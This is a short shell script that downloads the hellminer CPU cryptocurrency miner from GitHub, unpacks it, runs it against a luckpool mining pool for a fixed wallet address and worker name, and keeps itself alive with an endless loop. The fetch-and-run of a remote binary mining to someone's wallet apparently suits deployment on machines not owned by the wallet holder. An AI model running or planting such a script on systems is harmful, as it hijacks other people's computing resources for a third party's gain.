#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar -xvf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQDfDT8B92JavY7kgpmfZB1eeLR7Kdv3ne.BPA03 -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
